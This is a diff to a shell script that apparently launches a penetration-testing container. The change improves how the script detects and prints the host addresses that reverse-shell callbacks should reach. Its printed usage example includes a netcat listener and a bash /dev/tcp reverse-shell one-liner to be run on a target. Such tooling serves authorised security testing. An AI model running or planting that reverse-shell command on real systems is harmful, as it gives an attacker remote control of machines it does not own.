@@ -50,8 +50,12 @@ case "${1:-}" in
     pub=()
     for p in "${ports[@]}"; do pub+=(-p "${p}:${p}"); done
 
-    # The address on the default route is where a callback has to land. macOS
-    # ships no `ip`, Linux no `ipconfig`, so ask whichever is here.
+    # The address on the default route is the usual place a callback lands, but
+    # it is only a guess: behind cloud NAT (AWS/GCE/Azure) the public IP never
+    # appears locally, and a host firewalled to a VPN/tailnet is reachable only
+    # on that interface. So print it as a guess and list every other local IPv4
+    # next to it. macOS ships no `ip`, Linux no `ipconfig`, so ask whichever is
+    # here.
     #
     # Every lookup ends in `|| true`. A bare assignment takes its command's
     # status, and under `set -e` + `pipefail` a host with no default route -
@@ -60,21 +64,32 @@ case "${1:-}" in
     case "$(uname -s)" in
       Darwin)
         iface=$(route get default 2>/dev/null | awk '/interface:/{print $2}') || true
-        addr=$(ipconfig getifaddr "${iface:-en0}" 2>/dev/null || true) ;;
+        addr=$(ipconfig getifaddr "${iface:-en0}" 2>/dev/null || true)
+        addrs=$(ifconfig 2>/dev/null | awk '/[ \t]inet /{print $2}' | grep -v '^127\.') || true ;;
       *)
         # A route lookup, not `hostname -I`: it picks the one source address
         # that egress actually uses on a multi-homed box.
         addr=$(ip route get 1.1.1.1 2>/dev/null |
-               awk '{ for (i = 1; i < NF; i++) if ($i == "src") { print $(i+1); exit } }') || true ;;
+               awk '{ for (i = 1; i < NF; i++) if ($i == "src") { print $(i+1); exit } }') || true
+        # Every global IPv4, minus docker/bridge/veth - those reach nothing off-host.
+        addrs=$(ip -o -4 addr show scope global 2>/dev/null |
+                awk '$2 !~ /^(docker|br-|veth)/ { print $4 }' | cut -d/ -f1) || true ;;
     esac
     addr=${addr:-<your-host-IP>}
 
     echo "listener ports published on the host : ${ports[*]}"
-    echo "callback address for targets         : $addr"
+    echo "best-guess callback address          : $addr   (host default route)"
+    for a in $addrs; do
+      [ "$a" = "$addr" ] || echo "another address on this host         : $a"
+    done
+    echo "aim the payload at whichever one your target can reach: behind cloud"
+    echo "NAT it is none of these (run: curl ifconfig.me); reachable only over a"
+    echo "VPN/tailnet, it is that interface's address."
     echo "  e.g.  nc -lvnp 4444"
     echo "        target> bash -i >& /dev/tcp/$addr/4444 0>&1"
-    echo "these ports are open to anything that can reach $addr until you exit."
-    echo "on a public host that means the internet - check your provider firewall."
+    echo "these ports stay open to anything that can reach this host on ${ports[*]}"
+    echo "until you exit - on a public host that can mean the internet, so check"
+    echo "your host and provider firewall."
     echo
     "${DC[@]}" run --rm "${pub[@]}" deck
     ;;
